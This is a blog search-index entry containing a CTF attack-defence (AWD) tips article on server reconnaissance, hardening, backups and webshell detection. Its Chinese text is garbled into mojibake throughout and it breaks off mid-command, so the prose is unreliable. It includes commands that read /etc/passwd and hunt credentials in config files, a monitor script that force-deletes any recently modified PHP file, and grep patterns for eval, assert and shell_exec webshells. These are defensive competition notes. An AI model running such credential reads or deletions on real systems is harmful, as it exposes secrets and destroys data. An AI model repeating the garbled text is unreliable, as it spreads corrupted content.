<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Webã€AWDæ”»é˜²æŠ€å·§ã€‘</title>
      <link href="/2025/01/07/Web%E3%80%90AWD%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7%E3%80%91/"/>
      <url>/2025/01/07/Web%E3%80%90AWD%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Webã€AWDæ”»é˜²æŠ€å·§ã€‘"><a href="#Webã€AWDæ”»é˜²æŠ€å·§ã€‘" class="headerlink" title="Webã€AWDæ”»é˜²æŠ€å·§ã€‘"></a>Webã€AWDæ”»é˜²æŠ€å·§ã€‘</h1><h2 id="æ¢³ç†ä¿¡æ¯èµ„äº§"><a href="#æ¢³ç†ä¿¡æ¯èµ„äº§" class="headerlink" title="æ¢³ç†ä¿¡æ¯èµ„äº§"></a>æ¢³ç†ä¿¡æ¯èµ„äº§</h2><blockquote><p>æ— è®ºæ˜¯ä»æ¯”èµ›ï¼Œè¿˜æ˜¯è¯´å®é™…å·¥ä½œæ–¹é¢ï¼Œä¿¡æ¯çš„æ”¶é›†å¾€å¾€æ˜¯æœ€é‡è¦ä¹Ÿæ˜¯æœ€å…³é”®çš„ã€‚ä¹Ÿæ­£å¦‚é‚£å¥è¯ï¼š</p><p>çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ä¸æ®†ã€‚</p></blockquote><p><strong>å› ä¸ºæ˜¯AWDæ¨¡å¼ï¼Œå¾€å¾€æ—¶é—´éå¸¸ç´§è¿«ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤æ¥å¿«é€Ÿæ‰¾åˆ°ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯</strong></p><h5 id="ç»„ä»¶ä¿¡æ¯ï¼š"><a href="#ç»„ä»¶ä¿¡æ¯ï¼š" class="headerlink" title="ç»„ä»¶ä¿¡æ¯ï¼š"></a>ç»„ä»¶ä¿¡æ¯ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;nginx.conf&quot;</span>                 <span class="comment">#å®šä½nginxç›®å½•</span></span><br><span class="line">find / -path <span class="string">&quot;*nginx*&quot;</span> -name nginx*conf   <span class="comment">#å®šä½nginxé…ç½®ç›®å½•</span></span><br><span class="line">find / -name <span class="string">&quot;httpd.conf&quot;</span>                 <span class="comment">#å®šä½apacheç›®å½•</span></span><br><span class="line">find / -path <span class="string">&quot;*apache*&quot;</span> -name apache*conf <span class="comment">#å®šä½apacheé…ç½®ç›®å½•</span></span><br></pre></td></tr></table></figure><h5 id="ç”¨æˆ·ä¿¡æ¯ï¼š"><a href="#ç”¨æˆ·ä¿¡æ¯ï¼š" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯ï¼š"></a>ç”¨æˆ·ä¿¡æ¯ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">awk -F:<span class="string">&#x27;&#123;if ($3==0) print $1&#125;&#x27;</span> /etc/passwd#å¯æŸ¥è¯¢å¯ç™»å½•è´¦æˆ·UIDä¸º0çš„ç”¨æˆ·</span><br><span class="line">awk -F :<span class="string">&#x27;&#123;if(length($2)==0)print $1&#125;&#x27;</span> /etc/passwd <span class="comment">#å¯æŸ¥è¯¢æ— å¯†ç ç™»å½•è´¦æˆ·</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep <span class="string">&#x27;/bin/bash&#x27;</span>#å¯æŸ¥çœ‹å¯ç™»å½•è´¦æˆ·</span><br><span class="line">lastb <span class="comment">#å¯æ˜¾ç¤ºæŸ¥çœ‹ç”¨æˆ·é”™è¯¯çš„ç™»å½•åˆ—è¡¨ï¼ŒåŒ…æ‹¬é”™è¯¯çš„ç™»å½•æ–¹æ³•ã€ipåœ°å€ã€æ—¶é—´ç­‰</span></span><br><span class="line">lastlog <span class="comment">#å¯æŸ¥çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åçš„ç™»å½•ä¿¡æ¯</span></span><br><span class="line">last <span class="comment">#å¯æŸ¥çœ‹ç”¨æˆ·æœ€è¿‘ç™»å½•ä¿¡æ¯ï¼ˆæ•°æ®æºä¸º/var/log/wtmpã€/var/log/btmpã€/var/log/utmpï¼›wtmpå­˜è´®ç™»å½•æˆåŠŸçš„ä¿¡æ¯ã€btmpå­˜å‚¨ç™»å½•å¤±è´¥çš„ä¿¡æ¯ã€utmpå­˜è´®å½“å‰æ­£åœ¨ç™»å½•çš„ä¿¡æ¯ï¼‰</span></span><br></pre></td></tr></table></figure><h5 id="ç½‘ç«™å‘ç°ï¼š"><a href="#ç½‘ç«™å‘ç°ï¼š" class="headerlink" title="ç½‘ç«™å‘ç°ï¼š"></a>ç½‘ç«™å‘ç°ï¼š</h5><p>é€šå¸¸éƒ½ä½äº &#x2F;var&#x2F;www&#x2F;html ä¸­ï¼Œå¦‚æœæ²¡æœ‰è¯•è¯• find å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;index.php&quot;</span>   <span class="comment">#å®šä½ç½‘ç«™ç›®å½•</span></span><br><span class="line">find / -name <span class="string">&quot;index.jsp&quot;</span></span><br></pre></td></tr></table></figure><h5 id="æ—¥å¿—å‘ç°ï¼š"><a href="#æ—¥å¿—å‘ç°ï¼š" class="headerlink" title="æ—¥å¿—å‘ç°ï¼š"></a>æ—¥å¿—å‘ç°ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp:ç™»å½•é”™è¯¯ä¿¡æ¯</span><br><span class="line">/var/log/wtmp:è®°å½•ç™»å½•è¿›å…¥ã€é€€å‡ºã€æ•°æ®äº¤æ¢ã€å…³æœºå’Œé‡å¯ã€‚</span><br><span class="line">/var/log/cron:è®°å½•ä¸å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ã€‚</span><br><span class="line">/var/log/messages:è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—ã€‚</span><br><span class="line">/var/log/apache2/access.log:è®°å½•Apacheçš„è®¿é—®æ—¥å¿—ã€‚</span><br><span class="line">/var/log/auth.log:è®°å½•ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨æƒé™ç­‰ã€‚</span><br><span class="line">/var/log/userlog:è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚</span><br><span class="line">/var/log/xferlog(vsftpd.log):è®°å½•Linux FTPæ—¥å¿—ã€‚</span><br><span class="line">/var/log/lastlog:è®°å½•æœ€åä¸€æ¬¡ç™»å½•çš„ç”¨æˆ·ã€‚</span><br><span class="line">/var/log/secure:è®°å½•å¤§å¤šæ•°åº”ç”¨è¾“å…¥çš„è´¦æˆ·å¯†ç ï¼ŒåŠç™»å½•æˆåŠŸä¸å¦ã€‚</span><br><span class="line">/var/log/faillog:è®°å½•ç™»å½•ç³»ç»Ÿä¸æˆåŠŸçš„è´¦å·ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">/var/log/nginx/        <span class="comment">#é»˜è®¤Nginxæ—¥å¿—ç›®å½•</span></span><br><span class="line">/var/log/apache/       <span class="comment">#é»˜è®¤Apacheæ—¥å¿—ç›®å½•</span></span><br><span class="line">/var/log/apache2/      <span class="comment">#é»˜è®¤Apacheæ—¥å¿—ç›®å½•</span></span><br><span class="line">/usr/local/tomcat/logs <span class="comment">#Tomcatæ—¥å¿—ç›®å½•</span></span><br><span class="line"><span class="built_in">tail</span> -f xxx.log        <span class="comment">#å®æ—¶åˆ·æ–°æ»šåŠ¨æ—¥å¿—æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h5 id="æ–‡ä»¶ç›‘æ§ï¼š"><a href="#æ–‡ä»¶ç›‘æ§ï¼š" class="headerlink" title="æ–‡ä»¶ç›‘æ§ï¼š"></a>æ–‡ä»¶ç›‘æ§ï¼š</h5><p>æ–‡ä»¶ç›‘æ§èƒ½åŠæ—¶æœ¨é©¬æ–‡ä»¶åé—¨ç”Ÿæˆ,åŠæ—¶åˆ é™¤é˜²æ­¢ä¸¢åˆ†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> -mtime -7 <span class="comment">#æŸ¥æ‰¾æœ€è¿‘ä¿®æ”¹è¿‡çš„ PHP æ–‡ä»¶ï¼ˆä¾‹å¦‚è¿‡å» 7 å¤©å†…ä¿®æ”¹çš„ï¼‰</span></span><br></pre></td></tr></table></figure><h5 id="å…¶ä»–å¸¸ç”¨å‘½ä»¤ï¼š"><a href="#å…¶ä»–å¸¸ç”¨å‘½ä»¤ï¼š" class="headerlink" title="å…¶ä»–å¸¸ç”¨å‘½ä»¤ï¼š"></a>å…¶ä»–å¸¸ç”¨å‘½ä»¤ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano/-a    <span class="comment">#æŸ¥çœ‹ç«¯å£æƒ…å†µ</span></span><br><span class="line"><span class="built_in">uname</span> -a           <span class="comment">#ç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line">ps -aux ps -ef     <span class="comment">#è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd    <span class="comment">#ç”¨æˆ·æƒ…å†µ</span></span><br><span class="line"><span class="built_in">ls</span> /home/          <span class="comment">#ç”¨æˆ·æƒ…å†µ</span></span><br><span class="line"><span class="built_in">id</span>                 <span class="comment">#ç”¨äºæ˜¾ç¤ºç”¨æˆ·IDï¼Œä»¥åŠæ‰€å±ç¾¤ç»„ID</span></span><br><span class="line">find / -<span class="built_in">type</span> d -perm -002      <span class="comment">#å¯å†™ç›®å½•æ£€æŸ¥</span></span><br><span class="line">grep -r â€œflagâ€ /var/www/html/  <span class="comment">#æŸ¥æ‰¾é»˜è®¤FLAG</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨åŠ å›º"><a href="#å®‰å…¨åŠ å›º" class="headerlink" title="å®‰å…¨åŠ å›º"></a>å®‰å…¨åŠ å›º</h2><h5 id="ä¿®æ”¹é»˜è®¤å£ä»¤ï¼š"><a href="#ä¿®æ”¹é»˜è®¤å£ä»¤ï¼š" class="headerlink" title="ä¿®æ”¹é»˜è®¤å£ä»¤ï¼š"></a>ä¿®æ”¹é»˜è®¤å£ä»¤ï¼š</h5><p>ä¸é™äºæœåŠ¡å™¨SSHå£ä»¤ã€æ•°æ®åº“å£ä»¤ï¼ŒWEBæœåŠ¡å£ä»¤ä»¥åŠWEBåº”ç”¨åå°å£ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd username    <span class="comment">#sshå£ä»¤ä¿®æ”¹</span></span><br><span class="line"><span class="built_in">set</span> password <span class="keyword">for</span> mycms@localhost = password(<span class="string">&#x27;123&#x27;</span>); <span class="comment">#MySQLå¯†ç ä¿®æ”¹</span></span><br><span class="line">find /var/www//html -path <span class="string">&#x27;*config*â€™                #æŸ¥æ‰¾é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç å‡­è¯</span></span><br></pre></td></tr></table></figure><h5 id="å…³é—­ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼š"><a href="#å…³é—­ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼š" class="headerlink" title="å…³é—­ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼š"></a>å…³é—­ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼š</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --<span class="built_in">type</span>=service <span class="comment">#æŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡</span></span><br><span class="line">systemctl <span class="built_in">disable</span> &lt;æœåŠ¡å&gt;</span><br></pre></td></tr></table></figure><h5 id="é‡‡ç”¨å·¥å…·è„šæœ¬ç­‰ï¼š"><a href="#é‡‡ç”¨å·¥å…·è„šæœ¬ç­‰ï¼š" class="headerlink" title="é‡‡ç”¨å·¥å…·è„šæœ¬ç­‰ï¼š"></a>é‡‡ç”¨å·¥å…·è„šæœ¬ç­‰ï¼š</h5><p><strong>linuxæ–‡ä»¶ç›‘æ§</strong>ï¼ˆç½‘ä¸Šæ‰¾çš„ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#Usage ï¼špython demo.py</span></span><br><span class="line"><span class="comment">#Code by : AdminTony</span></span><br><span class="line"><span class="comment">#QQ : 78941695</span></span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šè¦å°†æ­¤æ–‡ä»¶æ”¾åœ¨æœ‰è¯»å†™æƒé™çš„ç›®å½•ä»¥åŠæ‰€æœ‰ä¿®æ”¹è¿‡çš„phpå¿…é¡»åœ¨æ­¤ç›®å½•æˆ–è€…è¯¥ç›®å½•çš„å­ç›®å½•ä¸­ã€‚</span></span><br><span class="line"><span class="comment">#ä½œç”¨ï¼šè¯»å–è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼Œç„¶åå°†æ–‡ä»¶çš„åœ°å€åŠ ä¸Šå†…å®¹å…¨éƒ¨å­˜æ”¾åœ¨txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys,subprocess,os</span><br><span class="line"><span class="comment">#æŸ¥æ‰¾æœ€è¿‘10åˆ†é’Ÿè¢«ä¿®æ”¹çš„æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanfile</span>():</span><br><span class="line"><span class="comment">#command: find -name &#x27;*.php&#x27; -mmin -10</span></span><br><span class="line">command = <span class="string">&quot;find -name \&#x27;*.php\&#x27; -mmin -10&quot;</span></span><br><span class="line">su = subprocess.Popen(command,shell=<span class="literal">True</span>,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">STDOUT,STDERR = su.communicate()</span><br><span class="line"><span class="built_in">list</span> = STDOUT.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment">#print str(list)</span></span><br><span class="line"><span class="comment">#å°†æ–‡ä»¶å¤„ç†æˆlistç±»å‹ç„¶åè¿”å›ã€‚</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯»å–æ–‡ä»¶ï¼š</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loadfile</span>(<span class="params">addr</span>):</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±è·³å‡ºå‡½æ•°</span></span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">file = <span class="built_in">open</span>(addr,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = file.read()</span><br><span class="line"><span class="keyword">except</span> : </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">all_data = addr+<span class="string">&quot;\n&quot;</span>+data+<span class="string">&quot;\n\n&quot;</span></span><br><span class="line">file1 = <span class="built_in">open</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"><span class="comment">#é¿å…é‡å¤å†™å…¥</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">shell_content = file1.read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">shell_content = <span class="string">&quot;null&quot;</span></span><br><span class="line"><span class="comment">#å¦‚æœæ–‡ä»¶å†…å®¹ä¸ä¸ºç©ºå†å†™å…¥ï¼Œé¿å…å†™å…¥ç©ºçš„ã€‚</span></span><br><span class="line"><span class="comment">#print shell_content</span></span><br><span class="line"><span class="keyword">if</span> data :</span><br><span class="line"><span class="keyword">if</span> all_data <span class="keyword">not</span> <span class="keyword">in</span> shell_content:</span><br><span class="line">file1.write(all_data)</span><br><span class="line">file.close()</span><br><span class="line">file1.close()</span><br><span class="line">rm_cmd = <span class="string">&quot;rm -rf &quot;</span>+addr</span><br><span class="line">su = subprocess.Popen(rm_cmd,shell=<span class="literal">True</span>,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">su.communicate()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;loadfile over : &quot;</span>+addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = scanfile()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span> :</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line"><span class="comment">#å¦‚æœlist[i]ä¸ºç©ºå°±ä¸è¯»å–äº†</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>[i]:</span><br><span class="line">loadfile(<span class="built_in">str</span>(<span class="built_in">list</span>[i]))</span><br><span class="line"><span class="keyword">else</span> : <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å¤‡ä»½æ–‡ä»¶ï¼š"><a href="#å¤‡ä»½æ–‡ä»¶ï¼š" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ï¼š"></a>å¤‡ä»½æ–‡ä»¶ï¼š</h5><p>é™¤äº†æ”»å‡»æˆåŠŸå¯ä»¥è®©å¯¹æ‰‹æ‰£åˆ†ï¼Œè¿˜èƒ½ç ´åå¯¹æ–¹ç¯å¢ƒä½¿å…¶å®•æœºè¢«checkæ‰£åˆ†ï¼›åŒæ—¶å·±æ–¹ä¹Ÿæœ‰å¯èƒ½åœ¨ä¿®å¤è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€äº›è¯¯æ“ä½œï¼Œå¯¼è‡´æºç å‡ºé”™ï¼Œè‡´ä½¿æœåŠ¡åœæ­¢ï¼›å¯¹é¡µé¢å¿«é€Ÿæ¢å¤æ—¶ï¼ŒåŠæ—¶å¤‡ä»½æ˜¯å¿…è¦çš„ï¼Œå› æ­¤é¡µé¢å¤‡ä»½è‡³å…³é‡è¦ã€‚</p><p><strong>å‹ç¼©æ–‡ä»¶</strong>ï¼š</p><p>è¦æ³¨æ„çš„æ˜¯ æœ‰çš„é¢˜ç›®ç¯å¢ƒå¯èƒ½ä¸æ”¯æŒ zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf web.tar /var/www/html</span><br><span class="line">zip -q -r web.zip /var/www/html</span><br></pre></td></tr></table></figure><p><strong>è§£å‹æ–‡ä»¶</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf web.tar -c /var/www/html</span><br><span class="line">unzip web.zip -d /var/www/html</span><br></pre></td></tr></table></figure><p><strong>å¤‡ä»½åˆ°æœåŠ¡å™¨</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> web.tar /tmp</span><br><span class="line"><span class="built_in">mv</span> web.zip /home/xxx</span><br></pre></td></tr></table></figure><p><strong>ä¸Šä¼ ä¸‹è½½æ–‡ä»¶</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scp username@servername:/path/filename /tmp/local_destination  <span class="comment">#ä»æœåŠ¡å™¨ä¸‹è½½å•ä¸ªæ–‡ä»¶åˆ°æœ¬åœ°</span></span><br><span class="line">scp /path/local_filename username@servername:/path             <span class="comment">#ä»æœ¬åœ°ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨</span></span><br><span class="line">scp -r username@servername:remote_dir/ /tmp/local_dir          <span class="comment">#ä»æœåŠ¡å™¨ä¸‹è½½æ•´ä¸ªç›®å½•åˆ°æœ¬åœ°</span></span><br><span class="line">scp -r /tmp/local_dir username@servername:remote_dir           <span class="comment">#ä»æœ¬åœ°ä¸Šä¼ æ•´ä¸ªç›®å½•åˆ°æœåŠ¡å™¨</span></span><br></pre></td></tr></table></figure><p><strong>å¤‡ä»½æŒ‡å®šæ•°æ®åº“</strong>ï¼š</p><p>æ•°æ®åº“é…ç½®ä¿¡æ¯ä¸€èˆ¬å¯ä»¥é€šè¿‡å¦‚config.php&#x2F;web.confç­‰æ–‡ä»¶è·å–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump â€“u username â€“p password databasename &gt; bak.sql</span><br></pre></td></tr></table></figure><p><strong>å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump â€“all -databases &gt; bak.sql</span><br></pre></td></tr></table></figure><p><strong>å¯¼å…¥æ•°æ®åº“</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql â€“u username â€“p password database &lt; bak.sql</span><br></pre></td></tr></table></figure><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>å°†æ–‡ä»¶å¤‡ä»½ä¸‹æ¥åï¼Œæ–¹ä¾¿åœ¨æœ¬åœ°å¼€å±•ä»£ç å®¡è®¡ç­‰å·¥ä½œï¼Œå› æ­¤ä¸ºæ—¶é—´ç´§è¿«ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ç³»åˆ—çš„æŸ¥æ€ã€å®¡è®¡å·¥å…·ç­‰ã€‚</p><ul><li>Dç›¾ï¼šæŸ¥æ€åé—¨</li><li>seayæºä»£ç å®¡è®¡ï¼šå®¡è®¡ä»£ç </li></ul><p><strong>AWDæ¨¡å¼ä¸­å­˜åœ¨çš„åé—¨ï¼š</strong></p><ul><li><p>å®˜æ–¹åé—¨ &#x2F; é¢„ç½®åé—¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç è¿›è¡ŒæŸ¥æ‰¾ï¼ˆé€šæ€ï¼‰</span></span><br><span class="line">find /var/www/html -name <span class="string">&quot;*.php&quot;</span> |xargs egrep <span class="string">&#x27;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>å¸¸è§„æ¼æ´ å¦‚SQLæ³¨å…¥ æ–‡ä»¶ä¸Šä¼  ä»£ç æ‰§è¡Œ åºåˆ—åŒ–åŠååºåˆ—åŒ–â€¦</p></li><li><p>é€‰æ‰‹åé—¨ï¼ˆé€‰æ‰‹åæœŸä¼ å…¥çš„æœ¨é©¬ï¼‰</p></li></ul><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>åœ¨ä»£ç å®¡è®¡ç»“æŸåï¼ŒåŠæ—¶å¯¹è‡ªèº«æ¼æ´è¿›è¡Œä¿®è¡¥ï¼Œè¦æ³¨æ„çš„æ˜¯æ¼æ´ä¿®å¤éµå¾ªä¿è¯æœåŠ¡ä¸é•¿æ—¶é—´å®•æœºçš„åŸåˆ™, åº”å½“å¤šä½¿ç”¨å®‰å…¨è¿‡æ»¤å‡½æ•°ï¼Œèƒ½ä¿®å¤å°½é‡ä¿®å¤,ä¸èƒ½ä¿®å¤å…ˆæ³¨é‡Šæˆ–åˆ é™¤ç›¸å…³ä»£ç ï¼Œä½†éœ€ä¿è¯é¡µé¢æ˜¾ç¤ºæ­£å¸¸ã€‚</p><h2 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h2><p>é€šè¿‡å‘½ä»¤æŸ¥çœ‹å¯ç–‘æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20                         <span class="comment">#æŸ¥çœ‹æœ€è¿‘20åˆ†é’Ÿä¿®æ”¹æ–‡ä»¶</span></span><br><span class="line">find ./ -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="built_in">wc</span> -l | <span class="built_in">sort</span> -u                    <span class="comment">#å¯»æ‰¾è¡Œæ•°æœ€çŸ­æ–‡ä»¶</span></span><br><span class="line">grep -r --include=*.php  <span class="string">&#x27;[^a-z]eval($_POST&#x27;</span>  /var/www/html      <span class="comment">#æŸ¥åŒ…å«å…³é”®å­—çš„phpæ–‡ä»¶</span></span><br><span class="line">find /var/www/html -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> |more</span><br></pre></td></tr></table></figure><h5 id="ä¸æ­»é©¬æŸ¥æ€ï¼š"><a href="#ä¸æ­»é©¬æŸ¥æ€ï¼š" class="headerlink" title="ä¸æ­»é©¬æŸ¥æ€ï¼š"></a>ä¸æ­»é©¬æŸ¥æ€ï¼š</h5><blockquote><p>1ã€é‡å¯æœåŠ¡</p><p>2ã€åˆ é™¤å¹¶åˆ›å»ºä¸€ä¸ªå’Œä¸æ­»é©¬è¦ç”Ÿæˆçš„é©¬ï¼Œåå­—ä¸€æ ·çš„è·¯å¾„åŠæ–‡ä»¶</p><p>3ã€æ€æ‰è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps [aux](https://so.csdn.net/so/search?q=aux&amp;spm=1001.2101.3001.7020) | grep www-data | awk 